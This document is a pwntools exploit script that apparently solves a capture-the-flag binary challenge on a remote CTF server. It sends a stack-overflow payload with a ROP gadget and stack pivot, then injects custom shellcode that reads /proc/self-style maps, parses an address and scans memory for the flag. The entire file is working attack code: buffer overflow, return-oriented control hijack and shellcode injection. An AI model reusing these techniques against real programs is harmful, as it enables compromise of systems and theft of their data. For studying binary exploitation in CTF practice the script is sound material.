from pwn import*
context.arch="amd64"
context.binary = ELF("./main")
context.terminal="xterm"
DEBUG=0
nc="nc ctf.taz.tn 10004"
r=nc.split(" ")
b="./main"
e=ELF(b)
if DEBUG==1:
    p=process(b)
elif DEBUG==2:
    p=process(b)
    gdb.attach(p,"""
    b *vuln+30
    c""")
else:
    p=remote(r[1],int(r[2]))

poprbp=0x00000000004012dd
xpage=0x700000

shellcode=asm("""
_start:
    mov rsp,0x404800
    mov rax,39
    syscall
    mov rdx,rax
    mov rbx, 0x7370616d2f2f2f
    push rbx
    
    mov     eax, edx
    lea     rdi, [rsp - 16]
    mov     rcx, 0
    convert_loop:
        xor     edx, edx
        mov     ebx, 10
        div     ebx
        add     dl, '0'
        dec     rdi
        mov     byte [rdi], dl
        inc     rcx
        test    eax, eax
        jnz     convert_loop
    mov rdx,[rdi]
    mov dl,0x2f
    movabs rax, 0x2f2f2f2f00000000
    add     rdx, rax
    push rdx
    mov rbx, 0x2f2f2f636f72702f
    push rbx
    mov rdi, rsp
    xor esi, esi
    mov rax, 2
    syscall
    mov rdi,3
    mov r12, rax
    sub rsp, 0x500
    mov rsi, rsp
    mov edx, 0x500
    xor eax, eax
    syscall
    add rsp,0x26a
 
    xor     rax, rax
    mov rsi,rsp


    parse_loop:
        mov   rcx, byte [rsi]
        cmp     cl, '-'
        je      done

        shl     rax, 4 

        cmp     cl, '9'
        jle     is_digit

        sub     cl, 'a' - 10
        jmp     store

    is_digit:
        sub     cl, '0'

    store:
        or      al, cl
        inc     rsi
        jmp     parse_loop
    done : 
        mov r15,rax
        add r15,0x1000000
        mov     rsi, rax
        jmp scan_loop


scan_loop:
    cmp     rsi, r15
    xor     rcx, rcx
    mov     cl, byte [rsi]
    cmp     cl, 'P'
    je      found
    inc     rsi
    jmp     scan_loop

found:
    mov rdi,1
    inc rsi
    mov rax,1
    syscall
""")


payload=b"a"*0x20+p64(0)+p64(poprbp)+p64(xpage+0x700+0x20)+p64(0x0000000000401a20+8)+p64(xpage+0x700-0x20)
p.send(payload)
p.wait(1)
payload2=b"a"*0x28+p64(xpage+0x700+0x30)
payload2+=shellcode
p.send(payload2)
p.interactive()